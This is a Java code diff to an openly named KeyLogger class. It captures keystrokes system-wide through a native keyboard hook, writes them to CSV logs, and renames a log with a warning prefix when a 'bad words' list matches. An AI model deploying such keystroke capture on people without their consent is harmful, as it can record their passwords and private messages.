@@ -4,22 +4,27 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 
-import java.io.BufferedWriter;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.Scanner;
 
 public abstract class KeyLogger {
 
+    private String badWordsFilePath = "src/main/resources/logger/BadWords.csv";
+    String filePath = "src/main/resources/logger/logs/" + getCurrentTime() + ".csv";
+    String warningFilePath = "src/main/resources/logger/logs/" + "WARNING!_" + getCurrentTime() + ".csv";
+
+
     String message;
     String sendKey;
-    String fileName;
-    AccessWindow accessWindow = new AccessWindow();
 
+    AccessWindow accessWindow = new AccessWindow();
 
     abstract void nativeKeyPressed(NativeKeyEvent event);
     abstract public void turnOn();
+    abstract void setDefaults();
 
 
     String getCurrentTime() {
@@ -28,14 +33,20 @@ public abstract class KeyLogger {
 
 
     void saveMessage() throws IOException {
-        BufferedWriter writer = new BufferedWriter(new FileWriter(fileName, true));
-        writer.write(message);
-        writer.newLine();
-        writer.flush();
-        writer.close();
-        System.out.println(message);
-        System.out.println("Message saved sucsessfully");
+        if(checkForBadWords(message)) {
+            File oldFile = new File(filePath);
+            filePath = warningFilePath;
+            File newFile = new File(warningFilePath);
+            if(oldFile.renameTo(newFile)){
+                System.out.println("Rename succesful");
+            }else{
+                System.out.println("Rename failed");
+            }
+        }
+        writeToFile(filePath);
     }
+
+
     public void turnOff()  {
         try {
             GlobalScreen.unregisterNativeHook();
@@ -49,8 +60,47 @@ public abstract class KeyLogger {
         }
     }
 
-    public void setFileName(String fileName) {
-        this.fileName = fileName;
+    private void writeToFile(String file) {
+        try {
+            BufferedWriter writer = new BufferedWriter(new FileWriter(file, true));
+            writer.write(message);
+            writer.newLine();
+            writer.flush();
+            writer.close();
+            System.out.println(message);
+            System.out.println("Message saved sucsessfully");
+            setDefaults();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private boolean checkForBadWords(String message) {
+        ArrayList<String> badWords = getBadWords();
+        for (String badWord: badWords) {
+            if(message.contains(badWord.toUpperCase())) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private ArrayList<String> getBadWords () {
+        ArrayList<String> badWords = new ArrayList<>();
+        Scanner scanner = null;
+        try {
+            scanner = new Scanner(new File(badWordsFilePath));
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+        while (scanner.hasNext()) {
+            badWords.add(scanner.nextLine());
+        }
+        return badWords;
+    }
+
+    public String getFilePath() {
+        return filePath;
     }
 
     public void nativeKeyReleased(NativeKeyEvent e) { }
